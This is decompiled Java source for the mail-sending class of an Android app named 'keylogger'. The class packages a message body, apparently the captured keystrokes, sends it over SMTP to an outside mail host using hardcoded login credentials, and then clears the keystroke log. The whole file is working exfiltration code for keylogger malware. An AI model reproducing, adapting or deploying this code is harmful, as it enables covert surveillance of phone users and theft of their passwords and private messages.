package com.example.keylogger;

import android.content.Context;
import android.util.Log;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import java.util.Properties;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/* loaded from: classes9.dex */
public class SendEmail {
    private final Context context;
    KeyLogs keylogs = new KeyLogs();
    private final String messageBody;
    private final String subject;
    private final String toEmail;

    public SendEmail(Context context, String toEmail, String subject, String messageBody) {
        this.context = context;
        this.toEmail = toEmail;
        this.subject = subject;
        this.messageBody = messageBody;
    }

    public void Send() {
        try {
            ExecutorService executorService = Executors.newSingleThreadExecutor();
            Future<Void> future = executorService.submit(new Callable() { // from class: com.example.keylogger.SendEmail$$ExternalSyntheticLambda0
                @Override // java.util.concurrent.Callable
                public final Object call() {
                    return SendEmail.this.m797lambda$Send$0$comexamplekeyloggerSendEmail();
                }
            });
            future.get();
            executorService.shutdown();
        } catch (Exception e10) {
            e10.printStackTrace();
            Log.d(NotificationCompat.CATEGORY_ERROR, e10.getMessage());
            showToast("Error sending email: " + e10.getMessage());
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$Send$0$com-example-keylogger-SendEmail, reason: not valid java name */
    public /* synthetic */ Void m797lambda$Send$0$comexamplekeyloggerSendEmail() throws Exception {
        openEmailClient(this.toEmail, this.subject, this.messageBody);
        return null;
    }

    public void openEmailClient(String toEmail, String subject, String body) {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "sandbox.smtp.mailtrap.io");
        props.put("mail.smtp.port", "465");
        Session session = Session.getInstance(props, new Authenticator() { // from class: com.example.keylogger.SendEmail.1
            @Override // javax.mail.Authenticator
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication("b15c9729198acf", "799fbcf9e5c654");
            }
        });
        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("b15c9729198acf"));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(toEmail));
            message.setSubject(subject);
            message.setText(body);
            Transport.send(message);
            KeyLogs.Empty();
            Log.d("Email", "sent");
        } catch (MessagingException e10) {
            e10.printStackTrace();
            Log.d("EmailERR", e10.getMessage());
        }
    }

    private void showToast(String message) {
        Toast.makeText(this.context, message, 0).show();
    }
}